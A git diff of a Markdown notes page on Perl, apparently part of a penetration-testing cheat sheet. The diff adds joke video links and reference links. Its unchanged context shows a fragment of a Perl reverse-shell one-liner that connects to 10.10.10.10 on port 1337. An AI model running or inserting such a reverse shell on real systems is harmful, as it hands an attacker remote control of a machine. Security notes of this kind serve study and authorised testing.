@@ -1,6 +1,9 @@
 # Perl
 
-Executing command line `perl` scripting requires `-e` flag for executing, without drop to a perl environment that does not save to a file:
+[Perl](https://www.youtube.com/watch?v=0jK0ytvjv-E) meme to make you laugh, before reading `perl` scripts. As a idiot beanbag Linguist it is not like a human language. [Fireship Explanation for neutrality](https://www.youtube.com/watch?v=74_7LrRe5DI)
+
+
+Executing command line `perl` scripting requires `-e` flag for executing, without drop to a `perl` environment that does not save to a file:
 ```bash
 perl -e 'your perl goes here'
 perl
@@ -43,3 +46,5 @@ use Socket;$i="$ENV{10.10.10.10}";$p=$ENV{1337};socket(S,PF_INET,SOCK_STREAM,get
 
 [haax.fr perl](https://cheatsheet.haax.fr/linux-systems/programing-languages/perl/)
 [apache - Perl Code Style Guides](https://cwiki.apache.org/confluence/display/VCL/Perl+Code+Style+Guidelines)
+[Perl Poet Interview](https://www.youtube.com/watch?v=0jK0ytvjv-E) 
+[Fireship Explanation for neutrality](https://www.youtube.com/watch?v=74_7LrRe5DI)
